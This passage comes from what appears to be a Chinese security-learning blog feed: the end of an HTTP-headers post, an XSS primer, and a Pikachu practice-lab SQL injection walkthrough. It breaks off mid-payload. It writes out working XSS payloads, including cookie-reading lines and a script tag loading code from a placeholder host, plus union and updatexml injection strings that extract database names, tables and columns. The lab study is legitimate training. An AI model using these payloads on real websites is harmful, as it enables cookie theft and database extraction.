title="协议"></a>协议</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP,超文本传输协议)是访问万维网使用的核心通信协议，也是今天所有Web应用程序使用的通信协议。最初，HTTP只是一个为获取基于文本的静态资源而开发的简单协议，后来人们以各种形式扩展和利用它.使其能够支持如今常见的复杂分布式应用程序。</span><br><span class="line"></span><br><span class="line">HTTP使用一种用于消息的模型:客户端送出一条请求消息，而后由服务器返回一条响应消息。该协议基本上不需要连接，虽然HTTP使用有状态的TCP协议作为它的传输机制，但每次请求与响应交换都会自动完成，并且可能使用不同的TCP连接。</span><br><span class="line"></span><br><span class="line">TCP就是一种传输协议，就像HTTP协议一样，HTTP的目的是指定了客户端可能发送给服务器什么样的消息以及得到什么样的响应，而TCP的目的是为了确保数据传输的可靠性，我给你一个数据包，你一定就要收到，收不到的话那么我就会给你重发，直到我超时放弃你了。</span><br><span class="line"></span><br><span class="line">HTTP是建立在TCP之上的，当你建立起TCP连接之后，在上面传输的数据用的是HTTP协议</span><br></pre></td></tr></table></figure><h3 id="请求头"><a href="#请求头" class="headerlink" title="请求头"></a>请求头</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">GET后面的/代表路径，HTTP/1.1代表HTTP的版本。</span><br><span class="line"></span><br><span class="line">HOST表示请求的服务器网址</span><br><span class="line"></span><br><span class="line">Connection表示持久的客户端与服务连接</span><br><span class="line"></span><br><span class="line">Cache-Control表示缓存开关</span><br><span class="line"></span><br><span class="line">sec-ch-ua可以理解用来替代user-agent的，用sec-ch-ua可以防止泄露浏览器详细信息</span><br><span class="line"></span><br><span class="line">sec-ch-ua-mobile表示浏览器名称和版本</span><br><span class="line"></span><br><span class="line">sec-ch-ua-platform表示操作系统名称</span><br><span class="line"></span><br><span class="line">Upgrade-Insecure-Requests 请求头向服务器发送一个客户端对HTTPS加密和认证响应良好，在https页面中，如果调用了http资源，那么浏览器就会抛出一些错误。为了改变成这一状况，chrome(谷歌浏览器)会在http请求中加入 &#x27;Upgrade-Insecure-Requests: 1&#x27; ，服务器收到请求后会返回 &quot;Content-Security-Policy: upgrade-insecure-requests&quot; 头，告诉浏览器，可以把所属本站的所有 http 连接升级为 https 连接。</span><br><span class="line"></span><br><span class="line">User-Agent表示发出请求的用户信息</span><br><span class="line"></span><br><span class="line">Accept表示指定客户端能够接收的内容类型</span><br><span class="line"></span><br><span class="line">Sec-Fetch-Site表示一个请求发起者的来源与目标资源来源之间的关系</span><br><span class="line"></span><br><span class="line">Sec-Fetch-Mode该请求头表明了一个请求的模式</span><br><span class="line"></span><br><span class="line">Sec-Fetch-Dest表示请求的目的地，即如何使用获取的数据</span><br><span class="line"></span><br><span class="line">Sec-Fetch-User取值是一个Boolean类型的值，true(?1)表示导航请求由用户激活触发(鼠标点击/键盘)，false(?0)表示导航请求由用户激活以外的原因触发</span><br><span class="line"></span><br><span class="line">Accept-Encoding指定浏览器可以支持的web服务器返回内容压缩编码类型。</span><br><span class="line"></span><br><span class="line">Accept-Language浏览器可接受的语言</span><br><span class="line"></span><br><span class="line">Cookie 就是一段字符串,是浏览器保存服务器返回数据的方法,通常保存用户身份信息</span><br><span class="line"></span><br><span class="line">X-Requested-With用于判断客户端请求是那种请求</span><br><span class="line"></span><br><span class="line">referrer是HTTP请求header的报文头，用于指明当前流量的来源参考页面。通过这个信息，我们可以知道访客是怎么来到当前页面的。</span><br></pre></td></tr></table></figure><p>文章参考：<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP">https://developer.mozilla.org/zh-CN/docs/Web/HTTP</a></p><p><a href="http://t.csdnimg.cn/kyAFX">http://t.csdnimg.cn/kyAFX</a></p>]]></content>
      
      
      <categories>
          
          <category> 网络协议 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> http协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss漏洞相关学习</title>
      <link href="/2024/08/10/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/08/10/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>XSS全称：跨站脚本(Cross Site Scripting) ,又称跨站脚本攻击，是一种针对网站应用程序的安全漏洞攻击技术，是代码注入的一种，服务器对用户提交的数据过滤不严，导致浏览器把用户的输入当成了JS代码并直接返回给客户端执行，从而实现对客户端的攻击目的。</p><p>xss漏洞分为三种：反射型，存储型和DOM型</p><h2 id="相关知识准备"><a href="#相关知识准备" class="headerlink" title="相关知识准备"></a>相关知识准备</h2><h3 id="测试语句"><a href="#测试语句" class="headerlink" title="测试语句"></a>测试语句</h3><p>以下所有标签的 &gt; 都可以用 &#x2F;&#x2F; 代替， 例如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script//</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">##&lt;script&gt;标签</span><br><span class="line">&lt;script&gt;alert(&quot;hack&quot;)&lt;/script&gt;   #弹出hack</span><br><span class="line">&lt;script&gt;alert(/hack/)&lt;/script&gt;   #弹出hack</span><br><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;        #弹出1，对于数字可以不用引号</span><br><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;      #弹出cookie</span><br><span class="line">&lt;script src=http://xxx.com/xss.js&gt;&lt;/script&gt;  #引用外部的xss</span><br><span class="line"></span><br><span class="line">##svg标签</span><br><span class="line">&lt;svg onload=&quot;alert(1)&quot;&gt;</span><br><span class="line"></span><br><span class="line">##&lt;img&gt;标签</span><br><span class="line">&lt;img src=1 οnerrοr=alert(&quot;hack&quot;)&gt;</span><br><span class="line">&lt;img src=1 οnerrοr=alert(document.cookie)&gt;  #弹出cookie</span><br><span class="line"></span><br><span class="line">##&lt;body&gt;标签</span><br><span class="line">&lt;body οnlοad=alert(1)&gt;</span><br><span class="line">&lt;body οnpageshοw=alert(1)&gt;</span><br><span class="line"></span><br><span class="line">##video标签</span><br><span class="line">&lt;video οnlοadstart=alert(1) src=&quot;/media/hack-the-planet.mp4&quot; /&gt;</span><br><span class="line"></span><br><span class="line">##style标签</span><br><span class="line">&lt;style οnlοad=alert(1)&gt;&lt;/style&gt;</span><br></pre></td></tr></table></figure><h3 id="插入位置"><a href="#插入位置" class="headerlink" title="插入位置"></a>插入位置</h3><ol><li>用户输入作为script标签内容</li><li>用户输入作为HTML注释内容</li><li>用户输入作为HTML标签的属性名</li><li>用户输入作为HTML标签的属性值</li><li>用户输入作为HTML标签的名字</li><li>直接插入到CSS里</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#用户输入作为HTML注释内容，导致攻击者可以进行闭合绕过</span><br><span class="line">&lt;!-- 用户输入 --&gt;</span><br><span class="line">&lt;!-- --&gt;&lt;script&gt;alert(&#x27;hack&#x27;)&lt;/script&gt;&lt;!-- --&gt;</span><br><span class="line"> </span><br><span class="line">#用户输入作为标签属性名，导致攻击者可以进行闭合绕过</span><br><span class="line">&lt;div 用户输入=&quot;xx&quot;&gt;  &lt;/div&gt;</span><br><span class="line">&lt;div &gt;&lt;/div&gt;&lt;script&gt;alert(&#x27;hack&#x27;)&lt;/script&gt;&lt;div a=&quot;xx&quot;&gt; &lt;/div&gt;</span><br><span class="line"> </span><br><span class="line">#用户输入作为标签属性值，导致攻击者可以进行闭合绕过</span><br><span class="line">&lt;div id=&quot;用户输入&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;div id=&quot;&quot;&gt;&lt;/div&gt;&lt;script&gt;alert(&#x27;hack&#x27;)&lt;/script&gt;&lt;div a=&quot;x&quot;&gt;&lt;/div&gt;</span><br><span class="line"> </span><br><span class="line">#用户输入作为标签名，导致攻击者可以进行闭合绕过</span><br><span class="line">&lt;用户输入  id=&quot;xx&quot; /&gt;</span><br><span class="line">&lt;&gt;&lt;script&gt;alert(&#x27;hack&#x27;)&lt;/script&gt;&lt;b id=&quot;xx&quot; /&gt;</span><br><span class="line"> </span><br><span class="line">#用户输入作为CSS内容，导致攻击者可以进行闭合绕过</span><br><span class="line">&lt;style&gt;用户输入&lt;style&gt;</span><br><span class="line">&lt;style&gt; &lt;/style&gt;&lt;script&gt;alert(&#x27;hack&#x27;)&lt;/script&gt;&lt;style&gt; &lt;/style&gt;</span><br></pre></td></tr></table></figure><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="反射型xss"><a href="#反射型xss" class="headerlink" title="反射型xss"></a>反射型xss</h3><p>反射型xss漏洞又称非持久型xss漏洞，攻击往往是一次性的，非持久化，需要欺骗用户自己去点击链接才能触发xss代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。反射型xss大多数是用来盗取用户的Cookie信息。</p><p>攻击者通过发送电子邮件等方式将包含xss代码的恶意链接发送给目标用户，当用户目标访问该链接时，服务器会接收该目标用户的请求并进行处理，然后服务器把带有xss代码的数据发送给目标用户的浏览器，浏览器解析了这段带有xss代码的恶意脚本后，就会触发xss漏洞。</p><p>下边拿pikachu靶场的xss漏洞举例，当我们在保单提交的页面提交数据后，数据会被输出到输出表单中，譬如下图，我们可以看到当我们输入11后，表单会回显我不在乎谁是11。</p><img src="/2024/08/10/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240811114650850.png" class="" title="image-20240811114650850"><p>此时我们发现页面的url变成了下图的模样，那么如果我们将xss语句写在messege里，我们会发现这里执行了我们的弹窗，说明代码被执行了，呢如果我们将代码换一下，换成document.cookie，我们会发现我们拿到了cookie的值</p><img src="/2024/08/10/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240811171537808.png" class="" title="image-20240811171537808"><img src="/2024/08/10/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240811171724996.png" class="" title="image-20240811171724996"><img src="/2024/08/10/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240811171935579.png" class="" title="image-20240811171935579"><h3 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h3><p>相较于反射型XSS，存储型XSS具有持久性特点。攻击者将恶意脚本永久地存储在目标服务器上，例如在博客文章内容、用户个人资料、论坛帖子等位置。每当任何用户访问到包含此类恶意内容的页面时，浏览器都会执行其中的恶意脚本。</p><p>例如，攻击者在发帖的过程中，将恶意脚本(例如下边的payload)连同正常信息一起注入帖子的内容中，随着帖子被服务器存储下来，恶意脚本也会存放在服务器的后端存储器中，当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本会在他们的浏览器中得到执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/hack by hacker/)&lt;/script&gt;</span><br></pre></td></tr></table></figure><img src="/2024/08/10/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240811174131190.png" class="" title="image-20240811174131190"><img src="/2024/08/10/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240811174143029.png" class="" title="image-20240811174143029"><h3 id="DOM型xss漏洞"><a href="#DOM型xss漏洞" class="headerlink" title="DOM型xss漏洞"></a>DOM型xss漏洞</h3><p>这种类型的XSS不涉及服务器端的数据存储，而是发生在客户端层面，即浏览器解析和动态修改DOM树的过程中。如果Web应用程序错误地使用来自不可信源的数据更新DOM，并且没有实施恰当的防御措施，攻击者就可以利用DOM-XSS漏洞注入恶意脚本。</p><p>这里也是以pikachu靶场domxss举例，输入任意内容，发现what do you see字样，来到控制台ctrl + F来搜索这句话，发现一个js里存在这句话，我们闭合之后使用payload，点击出现的what do you see就可以弹窗</p><img src="/2024/08/10/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240811182047408.png" class="" title="image-20240811182047408"><img src="/2024/08/10/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240811181849914.png" class="" title="image-20240811181849914"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onclick=&quot;alert(&#x27;ourobros&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure><img src="/2024/08/10/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240811182331269.png" class="" title="image-20240811182331269">]]></content>
      
      
      <categories>
          
          <category> top10漏洞 </category>
          
          <category> xss漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> top10 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pikachu靶场-sql注入</title>
      <link href="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<blockquote><p>[!NOTE]</p><p>快就是慢，少就是多</p></blockquote><h2 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h2><p>来到第一关，查询1，发现以下内容，抓个包，发现id参数在报文结尾，尝试注入</p><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807150838540.png" class="" title="image-20240807150838540"><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807150937769.png" class="" title="image-20240807150937769"><p>输入id&#x3D;1’,id&#x3D;1”都报错，初步确定为数字型注入，输入以下内容查看返回结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=1 and 1=1--+</span><br><span class="line">id=1 and 1=2--+</span><br></pre></td></tr></table></figure><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807151047621.png" class="" title="image-20240807151047621"><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807161223794.png" class="" title="image-20240807161223794"><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807151306347.png" class="" title="image-20240807151306347"><p>结果不同，确定为数字型注入，开始确定字段行数，最终确定行数为2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 order by 3--+</span><br></pre></td></tr></table></figure><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807151842335.png" class="" title="image-20240807151842335"><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807151901093.png" class="" title="image-20240807151901093"><p>开始尝试注入，确定位置为姓名为1，email为2.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,2--+</span><br></pre></td></tr></table></figure><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807152215484.png" class="" title="image-20240807152215484"><p>获取当前数据库版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,version()--+</span><br></pre></td></tr></table></figure><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807152847190.png" class="" title="image-20240807152847190"><p>获取当前用户名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,user()--+</span><br></pre></td></tr></table></figure><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807152516383.png" class="" title="image-20240807152516383"><p>获取当前库名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,database()--+</span><br></pre></td></tr></table></figure><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807152616601.png" class="" title="image-20240807152616601"><p>获取其他库名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,group_concat(SCHEMA_NAME) from information_schema.SCHEMATA--+             #获取全部库名，后续不再使用</span><br><span class="line">id=-1 union select 1,SCHEMA_NAME from information_schema.SCHEMATA limit 0,1--+                                    #获取第一行库名</span><br></pre></td></tr></table></figure><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807153425664.png" class="" title="image-20240807153425664"><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807153627335.png" class="" title="image-20240807153627335"><p>获取表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,table_name from information_schema.tables where table_schema=&#x27;pikachu&#x27; limit 0,1--+</span><br></pre></td></tr></table></figure><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807153502694.png" class="" title="image-20240807153502694"><p>获取字段名</p><p>第一行是id没什么用，这里我们查第二行，是userid…….,算了，全拿出来吧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,column_name from information_schema.columns where table_schema=&#x27;pikachu&#x27; and table_name=&#x27;httpinfo&#x27; limit 1,1--+</span><br><span class="line">id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=&#x27;pikachu&#x27; and table_name=&#x27;httpinfo&#x27;--+</span><br></pre></td></tr></table></figure><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807153942345.png" class="" title="image-20240807153942345"><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807154036749.png" class="" title="image-20240807154036749"><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807154214136.png" class="" title="image-20240807154214136"><p>看看值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,group_concat(ipaddress) from httpinfo limit 0,1--+</span><br></pre></td></tr></table></figure><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807154621053.png" class="" title="image-20240807154621053"><h2 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h2><p>与其说时字符型注入，我更倾向于叫这关报错注入，因为时查看报错信息判断的注入方式</p><p>来到第二关，当我们输入?name&#x3D;1时,会返回一串没什么卵用的信息，我们输入1”时，会返回你输入的username不存在，我们输入1’，返回报错信息。</p><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807160950184.png" class="" title="image-20240807160950184"><p>那这一关我们将参数后加上’，后续与第一关一样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">name=1&#x27; and 1=1--+</span><br><span class="line">name=1&#x27; and 1=2--+</span><br><span class="line"></span><br><span class="line">name=1&#x27; order by 3--+</span><br><span class="line"></span><br><span class="line">name=-1&#x27; union select 1,2--+</span><br><span class="line"></span><br><span class="line">name=-1&#x27; union select 1,version()--+</span><br><span class="line"></span><br><span class="line">name=-1&#x27; union select 1,user()--+</span><br><span class="line"></span><br><span class="line">name=-1&#x27; union select 1,database()--+</span><br><span class="line"></span><br><span class="line">name=-1&#x27; union select 1,group_concat(SCHEMA_NAME) from information_schema.SCHEMATA--+  </span><br><span class="line"></span><br><span class="line">name=-1&#x27; union select 1,table_name from information_schema.tables where table_schema=&#x27;pikachu&#x27; limit 0,1--+</span><br><span class="line"></span><br><span class="line">name=-1&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_schema=&#x27;pikachu&#x27; and table_name=&#x27;httpinfo&#x27;--+</span><br><span class="line"></span><br><span class="line">name=-1&#x27; union select 1,group_concat(ipaddress) from httpinfo limit 0,1--+</span><br></pre></td></tr></table></figure><p>既然注入方式判断和报错注入差不多，我们就试试报错注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=1&#x27; and updatexml(1,concat(0x7e,(select user()),0x7e),1)--+</span><br></pre></td></tr></table></figure><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807163834766.png" class="" title="image-20240807163834766"><p>果然，这一关是可以使用报错注入的。</p><p>相关payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#获取use()值</span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,(select user()),0x7e),1)--+</span><br><span class="line"></span><br><span class="line">#获取库名</span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+ </span><br><span class="line">                                                              #方法一</span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,(select schema_name from         information_schema.schemata limit 0,1),0x7e),1)--+            #方法二</span><br><span class="line"></span><br><span class="line">#获取表名</span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;pikachu&#x27; limit 0,1),0x7e),1)--+</span><br><span class="line"></span><br><span class="line">#获取字段名</span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=&#x27;pikachu&#x27; and table_name=&#x27;httpinfo&#x27; limit 0,1),0x7e),1)--+</span><br><span class="line"></span><br><span class="line">#获取值</span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,(select ipaddress from httpinfo limit 0,1),0x7e),1)--+</span><br></pre></td></tr></table></figure><h2 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h2><p>我们在发送name&#x3D;1的报文，发现返回一堆的信息，都没啥卵用，发送name&#x3D;1”会筛选掉一部分，但是也没看出来有什么卵用。</p><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807170333881.png" class="" title="image-20240807170333881"><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807170437884.png" class="" title="image-20240807170437884"><p>之后发现如果输入?username&#x3D;1’,会返回报错信息，通过报错信息，判断闭合方式为%’</p><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807170631404.png" class="" title="image-20240807170631404"><p>将单引号换成%’构造payload。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=1%&#x27; order by 4--+</span><br></pre></td></tr></table></figure><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807171406386.png" class="" title="image-20240807171406386"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=-1%&#x27; union select 1,2,3--+</span><br></pre></td></tr></table></figure><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807171440075.png" class="" title="image-20240807171440075"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">name=-1%&#x27; union select 1,version()--+</span><br><span class="line"></span><br><span class="line">name=-1%&#x27; union select 1,user()--+</span><br><span class="line"></span><br><span class="line">name=-1%&#x27; union select 1,database()--+</span><br></pre></td></tr></table></figure><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807171531504.png" class="" title="image-20240807171531504"><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807171549882.png" class="" title="image-20240807171549882"><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807171607177.png" class="" title="image-20240807171607177"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=-1%&#x27; union select 1,2,group_concat(SCHEMA_NAME) from information_schema.SCHEMATA--+  </span><br></pre></td></tr></table></figure><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807172434625.png" class="" title="image-20240807172434625"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=-1%&#x27; union select 1,2,group_concat(SCHEMA_NAME) from information_schema.SCHEMATA--+  </span><br></pre></td></tr></table></figure><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807172517355.png" class="" title="image-20240807172517355"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=-1%&#x27; union select 1,2,table_name from information_schema.tables where table_schema=&#x27;pikachu&#x27; limit 0,1--+</span><br></pre></td></tr></table></figure><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807172610771.png" class="" title="image-20240807172610771"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=-1%&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where 